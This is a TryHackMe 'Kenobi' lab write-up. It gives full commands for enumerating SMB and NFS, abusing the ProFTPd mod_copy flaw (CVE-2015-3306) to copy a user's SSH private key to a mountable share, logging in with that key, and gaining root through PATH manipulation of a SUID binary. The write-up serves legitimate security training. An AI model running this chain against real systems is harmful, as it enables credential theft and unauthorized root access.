---
title: THM — Kenobi
type: lab-writeup
platform: THM
difficulty: foundational
os: Linux
status: Complete
date: 2026-03-27
tags:
  - foundational
  - lab
  - THM
  - linux
  - samba
  - smb
  - proftpd
  - suid
  - nfs
  - path-manipulation
---

# THM — Kenobi

## Lab Info

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Room | Kenobi |
| Difficulty | Easy |
| OS | Ubuntu |
| IP | Machine IP (assigned at room launch) |
| Date | 2026-03-27 |

> **Summary:** SMB share enumeration reveals useful info. ProFTPd 1.3.5 mod_copy vulnerability allows copying an SSH private key to an NFS-accessible mount. SUID binary with PATH manipulation grants root.

---

## Objectives

- [x] Recon: enumerate SMB shares and NFS exports
- [x] Exploit: leverage ProFTPd mod_copy to steal SSH key
- [x] Escalate: abuse SUID binary via PATH injection
- [x] Capture user and root flags

---

## Enumeration

### Port scan

```bash
nmap -sC -sV -p- -oN nmap/kenobi_full <MACHINE_IP>
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 21/tcp | ftp | ProFTPd 1.3.5 |
| 22/tcp | ssh | OpenSSH 7.2p2 |
| 80/tcp | http | Apache httpd 2.4.18 |
| 111/tcp | rpcbind | NFS-related |
| 139/tcp | netbios-ssn | Samba |
| 445/tcp | microsoft-ds | Samba |
| 2049/tcp | nfs | NFS share |

### SMB enumeration

```bash
nmap -p 445 --script=smb-enum-shares,smb-enum-users <MACHINE_IP>
smbclient //<IP>/anonymous -N
```

- Anonymous share accessible — contains `log.txt` with ProFTPd config and SSH key location (`/home/kenobi/.ssh/id_rsa`)

### NFS enumeration

```bash
showmount -e <MACHINE_IP>
```

Result: `/var` is exported (mountable)

---

## Vulnerability Background

**ProFTPd 1.3.5 mod_copy** — unauthenticated file copy

| Field | Detail |
|---|---|
| CVE | CVE-2015-3306 |
| Affected | ProFTPd ≤ 1.3.5 with mod_copy enabled |
| Type | Unauthenticated arbitrary file read/copy on server |
| Commands | `SITE CPFR` (copy from) and `SITE CPTO` (copy to) |
| Impact | Read any file the ProFTPd process can access |

---

## Foothold

### Exploit mod_copy to steal SSH key

Connect to FTP port and use SITE commands (no authentication needed):

```bash
nc <MACHINE_IP> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

### Mount NFS and retrieve key

```bash
mkdir /mnt/kenobi
mount <MACHINE_IP>:/var /mnt/kenobi
cp /mnt/kenobi/tmp/id_rsa .
chmod 600 id_rsa
```

### SSH login

```bash
ssh -i id_rsa kenobi@<MACHINE_IP>
```

**Result:** Shell as `kenobi`

---

## Privilege Escalation

### Find SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

Unusual binary: `/usr/bin/menu`

### Analyse the binary

```bash
strings /usr/bin/menu
```

Output shows the binary runs system commands without full path:
```
curl
uname
ifconfig
```

### PATH manipulation

```bash
cd /tmp
echo '/bin/bash' > curl
chmod +x curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

Select option 1 (which calls `curl`) — binary executes `/tmp/curl` (which is `/bin/bash`) as root.

**Result:** Root shell.

---

## Flags

| Flag | Location |
|---|---|
| User | `/home/kenobi/user.txt` |
| Root | `/root/root.txt` |

> Flag values omitted — record yours privately.

---

## Key Takeaways

- SMB anonymous shares frequently leak sensitive information — always enumerate first
- NFS exports combined with another vulnerability can create powerful attack chains
- `mod_copy` in ProFTPd is a classic example of a feature becoming a vulnerability — file copy without auth
- SUID binaries calling commands without absolute paths are vulnerable to PATH injection
- Always run `strings` on unknown SUID binaries to understand what they execute
- `find / -perm -u=s` is a mandatory privesc enumeration step on Linux

---

## Tools Used

- Nmap
- Netcat
- smbclient
- showmount / mount

---

## References

- [TryHackMe — Kenobi](https://tryhackme.com/room/kenobi)
- [NVD CVE-2015-3306](https://nvd.nist.gov/vuln/detail/CVE-2015-3306)
- [GTFOBins — SUID](https://gtfobins.github.io/)

---
*Write-up completed: 2026-03-27*

## See Also

- Penetration-Testing-Methodology
- Linux-Privilege-Escalation
- Nmap
- File-Transfer-Techniques
- Common-Ports

---
<- [[Labs-MOC]]